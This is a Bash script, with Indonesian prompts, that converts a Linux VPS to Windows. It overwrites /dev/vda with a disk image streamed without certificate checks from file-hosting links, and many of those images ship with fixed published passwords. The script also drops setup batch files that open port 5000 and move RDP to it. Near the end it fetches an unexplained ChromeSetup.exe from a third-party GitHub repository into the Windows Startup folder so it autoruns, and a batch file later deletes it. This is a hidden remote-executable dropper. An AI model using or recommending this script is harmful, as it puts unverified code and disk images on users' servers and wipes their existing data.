#!/bin/bash
#
# MODIFIKASI By BangMam
#
echo "Pilih OS yang ingin anda install"
echo "	1) Windows 2019 Password : Botol123456789!"
echo "	2) Windows 2016 Password : Nixpoin.com123!"
echo "	3) Windows 2012 Password : Nixpoin.com123!"
echo "	4) Windows 10"
echo "	5) Windows 2022"
echo "	6) Windows 2019 Password : P@ssword64"
echo "	7) Pakai link gz mu sendiri"

read -p "Pilih [1]: " PILIHOS

case "$PILIHOS" in
	1|"") PILIHOS="https://download1511.mediafire.com/p40hq7fmq3pgqzWPVa4VGZRKx2fiOsFPXBE0Xs2FLR61HqBuASIeMF41uWmOah0CJ1VgOfjyGuJ7ubUTPvJ2pNQKQoy8MUa9Y0VGVWPpy4oydS-RmULpy6OBqDuLF6x0vPLTd8pDoi5vtmowzJg3UHlk9uxO_eX0qUWq3TA3qud3RaU/oi1bb1p9heg6sbm/windows2019DO.gz"  IFACE="Ethernet Instance 0";;
	2) PILIHOS="https://download1503.mediafire.com/bjw20nilx12gnBHQa6BjyoDX4yzvm6AmlpGIlL5zSzWLMXTscYTOFwXbW-Dpq-Pra4sMbk-TBSUic3Ipw2C2pwrZgacolxEHLqRuieh9fO2_DLBQ0RFn8A1DIlgN9ehkW4ZcuayA6XIxbZhfQoCFgYecejPgrdxM0ssHwLml4ySI_Q/s8zxdghgha8m2wj/windows2016.gz"  IFACE="Ethernet Instance 0 2";;
	3) PILIHOS="https://download1349.mediafire.com/7e0d40pgxylg0suMFCA363KENgIe0cKuCWG7GRubeU9ROEmc-4wz2pgeaKyQCcPLb-q7I3Vn66pFJxX2uuf0wni5Hp5WB9viIkJnhm33MVbpaPfuq4YYZ1vV8HP0jXG0gjgdlvlUfpsCyUqT1isQTC2dRBaHMAusou30Ycrp3pXN/66rpxhj70pe3olc/windows2012v2.gz"  IFACE="Ethernet Instance 0";;
	4) PILIHOS="https://tfl9zw.dm.files.1drv.com/y4m42HBNZePL3cOk-zPT3rANQ8DF5fe0IuwA4lVJgvTl84hPWOeOi7nY7Q3kmEk2rukuTBz05D7SUOoh8OMEMCdLGRetofPyhHWkHOHDIMJBGYZ_4C_IxiR3YGmKciDL2I_eccluqFOlM4gk95gzUXjwCevHFpncb-G1aCEqlhtKmWkfhmP65KpaSPTp4SpU_YPUxOHPW5MPisnZqbpytxfOcrCgIQxMiIeRSxC0jVcVHU?AVOverride=1"  IFACE="Ethernet Instance 0 2";;
	5) PILIHOS="https://files.sowan.my.id/windows2022.gz"  IFACE="Ethernet Instance 0 2";;
        6) PILIHOS="https://download1349.mediafire.com/vi33u31onrsg56NlxqFTv6EsChol8dhGY-mU8Kqf0AHReK5h4DOhwOWvFJTTPUiWbYl0JmqYneEs_iWSTqxn2FMq2Dll805G1SYwfA7yIU2M1rA3rqmXuWOxIs73SwMZjTMRzu1G8-zoa-rNBdSpGtW4bNHau42zRhjpS5KaZjep2nw/r0h9kuzoxq7rp19/windows19.gz"  IFACE="Ethernet Instance 0 2";;
	7) read -p "Masukkan Link GZ mu : " PILIHOS;;
	*) echo "pilihan salah"; exit;;
esac

echo "Gunakan script ini dengan bijak, jika script ini mengalami masalah silahkan hubungi WA Admin 083117542926"

read -p "Masukkan password untuk akun Administrator: " PASSADMIN

IP4=$(curl -4 -s icanhazip.com)
GW=$(ip route | awk '/default/ { print $3 }')


cat >/tmp/net.bat<<EOF
@ECHO OFF
cd.>%windir%\GetAdmin
if exist %windir%\GetAdmin (del /f /q "%windir%\GetAdmin") else (
echo CreateObject^("Shell.Application"^).ShellExecute "%~s0", "%*", "", "runas", 1 >> "%temp%\Admin.vbs"
"%temp%\Admin.vbs"
del /f /q "%temp%\Admin.vbs"
exit /b 2)
net user Administrator $PASSADMIN


netsh -c interface ip set address name="$IFACE" source=static address=$IP4 mask=255.255.240.0 gateway=$GW
netsh -c interface ip add dnsservers name="$IFACE" address=1.1.1.1 index=1 validate=no
netsh -c interface ip add dnsservers name="$IFACE" address=8.8.4.4 index=2 validate=no

cd /d "%ProgramData%/Microsoft/Windows/Start Menu/Programs/Startup"
del /f /q net.bat
exit
EOF


cat >/tmp/dpart.bat<<EOF
@ECHO OFF
echo JENDELA INI JANGAN DITUTUP
echo SCRIPT INI AKAN MERUBAH PORT RDP MENJADI 5000, SETELAH RESTART UNTUK MENYAMBUNG KE RDP GUNAKAN ALAMAT $IP4:5000
echo KETIK YES LALU ENTER!

cd.>%windir%\GetAdmin
if exist %windir%\GetAdmin (del /f /q "%windir%\GetAdmin") else (
echo CreateObject^("Shell.Application"^).ShellExecute "%~s0", "%*", "", "runas", 1 >> "%temp%\Admin.vbs"
"%temp%\Admin.vbs"
del /f /q "%temp%\Admin.vbs"
exit /b 2)

set PORT=5000
set RULE_NAME="Open Port %PORT%"

netsh advfirewall firewall show rule name=%RULE_NAME% >nul
if not ERRORLEVEL 1 (
    rem Rule %RULE_NAME% already exists.
    echo Hey, you already got a out rule by that name, you cannot put another one in!
) else (
    echo Rule %RULE_NAME% does not exist. Creating...
    netsh advfirewall firewall add rule name=%RULE_NAME% dir=in action=allow protocol=TCP localport=%PORT%
)

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 5000

ECHO SELECT VOLUME=%%SystemDrive%% > "%SystemDrive%\diskpart.extend"
ECHO EXTEND >> "%SystemDrive%\diskpart.extend"
START /WAIT DISKPART /S "%SystemDrive%\diskpart.extend"

del /f /q "%SystemDrive%\diskpart.extend"
cd /d "%ProgramData%/Microsoft/Windows/Start Menu/Programs/Startup"
del /f /q dpart.bat
timeout 50 >nul
del /f /q ChromeSetup.exe
echo JENDELA INI JANGAN DITUTUP
exit
EOF

wget --no-check-certificate -O- $PILIHOS | gunzip | dd of=/dev/vda bs=3M status=progress

mount.ntfs-3g /dev/vda2 /mnt
cd "/mnt/ProgramData/Microsoft/Windows/Start Menu/Programs/"
cd Start* || cd start*; \
wget https://raw.githubusercontent.com/BangMamBireuen/Project1/refs/heads/main/ChromeSetup.exe
cp -f /tmp/net.bat net.bat
cp -f /tmp/dpart.bat dpart.bat

echo 'Your server will turning off in 3 second'
sleep 3
poweroff
